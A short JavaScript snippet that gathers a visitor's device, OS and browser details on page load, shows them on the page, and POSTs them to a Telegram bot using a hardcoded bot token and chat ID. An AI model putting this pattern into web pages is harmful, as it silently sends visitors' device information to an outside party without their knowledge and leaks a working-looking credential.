window.addEventListener("DOMContentLoaded", () => {
  const parser = new UAParser();
  const result = parser.getResult();

  const deviceInfo = `
📲 Device Info
---------------
Vendor: ${result.device.vendor || 'Unknown'}
Model: ${result.device.model || 'Unknown'}
OS: ${result.os.name || 'Unknown'} ${result.os.version || ''}
Browser: ${result.browser.name || 'Unknown'} ${result.browser.version || ''}
User-Agent:
${navigator.userAgent}
  `;

  // Replace with your bot token and chat ID
  const botToken = "7606461880:AAGtzFYAcUjppyIsKKaEyqOGRBj1mWFbXeQ";
  const chatId = "2071334805";

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: deviceInfo
    })
  }).then(response => {
    console.log("Sent to Telegram");
  }).catch(error => {
    console.error("Error sending to Telegram:", error);
  });

  document.getElementById("output").textContent = deviceInfo;
});
